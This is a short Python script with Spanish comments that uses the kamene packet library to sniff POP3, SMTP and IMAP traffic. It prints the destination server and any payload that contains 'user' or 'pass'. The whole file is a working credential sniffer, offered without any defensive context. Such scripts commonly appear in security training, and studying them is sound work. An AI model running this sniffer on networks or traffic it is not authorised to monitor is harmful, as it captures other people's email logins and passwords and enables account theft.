from kamene.all import *

# callback del paquete
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = bytes(packet[TCP].payload)
        if b'user' in mail_packet.lower() or b'pass' in mail_packet.lower():
            print("[*] Servidor: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)


# inicializamos el sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
      prn=packet_callback,
      store=0)
